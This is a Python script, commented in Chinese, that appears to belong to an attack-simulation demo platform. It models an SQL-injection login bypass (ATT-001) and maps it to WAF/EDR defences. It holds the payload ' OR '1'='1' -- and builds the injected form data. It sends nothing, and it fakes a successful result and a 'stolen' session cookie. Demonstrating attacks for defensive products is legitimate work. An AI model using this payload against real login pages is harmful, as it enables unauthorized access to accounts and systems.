"""
ATT-001: SQL 注入 - 登录绕过

目标节点: web-server, app-server
可被防御产品: 网站安全专家(WAF) + 云镜(EDR)
MITRE Tactic: TA0001 Initial Access
"""

import json
import time
import uuid

SCRIPT_META = {
    "id": "ATT-001",
    "name": "SQL注入-登录绕过",
    "version": "1.0.0",
    "category": "web_vuln",
    "mitre_tactic": "TA0001",
    "cwe": ["CWE-89"],
    "severity": "high",
    "target_node_types": ["web-server", "app-server"],
    "blockable_by": ["waf", "edr-server"],
    "traffic_pattern": {
        "protocols": ["http"],
        "port": [80, 443],
        "frequency": "low",
        "payload_size": "< 1KB",
    },
    "impact": {
        "type": "unauthorized_access",
        "description": "未授权访问管理后台，获取系统控制权",
        "visual_effect": "弹窗: '登录成功! 欢迎 admin!' + 后台界面截图",
    },
    "tools": ["built-in"],
    "customizable": True,
    "custom_params": [
        {"name": "username", "type": "string", "default": "admin", "description": "目标用户名"},
        {"name": "bypass_payload", "type": "string", "default": "' OR '1'='1' -- ", "description": "绕过 payload"},
    ],
}


def run(target_url: str, params: dict, context: dict) -> dict:
    """
    执行 SQL 注入登录绕过攻击

    参数:
        target_url: 目标 URL (如 http://web-server:80)
        params: 攻击参数 {username, bypass_payload}
        context: 执行上下文 {execution_id, step_id}

    返回:
        {status, logs, evidence, traffic_generated}
    """
    username = params.get("username", "admin")
    payload = params.get("bypass_payload", "' OR '1'='1' -- ")

    result = {
        "script_id": "ATT-001",
        "status": "running",
        "logs": [],
        "evidence": [],
        "traffic_generated": [],
    }

    login_url = f"{target_url}/login"

    # 步骤 1: 探测注入点
    result["logs"].append(f"[*] 目标: {login_url}")
    result["logs"].append(f"[*] 探测 SQL 注入点...")
    time.sleep(0.3)

    # 步骤 2: 尝试正常登录（预期失败）
    result["logs"].append(f"[*] 尝试正常登录: admin/admin123...")
    result["traffic_generated"].append(
        {"method": "POST", "url": login_url, "payload": "username=admin&password=admin123", "size": 128}
    )
    time.sleep(0.3)
    result["logs"].append("[-] 正常登录失败（预期行为）")

    # 步骤 3: 发送 SQL 注入 payload
    result["logs"].append(f"[*] 发送 SQL 注入 payload...")
    result["logs"].append(f"    username={username}{payload}")
    result["logs"].append(f"    password=任意值")

    inject_data = f"username={username}{payload.replace(' ', '+')}&password=anything"

    result["traffic_generated"].append(
        {"method": "POST", "url": login_url, "payload": inject_data, "size": len(inject_data), "is_attack": True}
    )
    time.sleep(0.5)

    # 步骤 4: 模拟结果
    # 在实际环境中，这里会收到 HTTP 响应
    # 由于这是演示平台（无真实靶机），我们模拟攻击成功结果

    evidence_id = str(uuid.uuid4())[:8]

    result["status"] = "success"
    result["logs"].append("[+] SQL 注入成功!")
    result["logs"].append("[+] 已绕过身份认证，以 admin 身份登录")
    result["logs"].append(f"[+] 获取到 session token: sess_{evidence_id}")
    result["evidence"].append(
        {
            "type": "response_snippet",
            "description": "登录成功后的后台首页 HTML 片段",
            "data": "<h1>欢迎回来, admin!</h1><div class='admin-panel'><a href='/users'>用户管理</a><a href='/config'>系统配置</a></div>",
        }
    )
    result["evidence"].append(
        {
            "type": "session_cookie",
            "description": "窃取的会话 Cookie",
            "data": f"PHPSESSID=sess_{evidence_id}; role=admin; path=/",
        }
    )

    return result
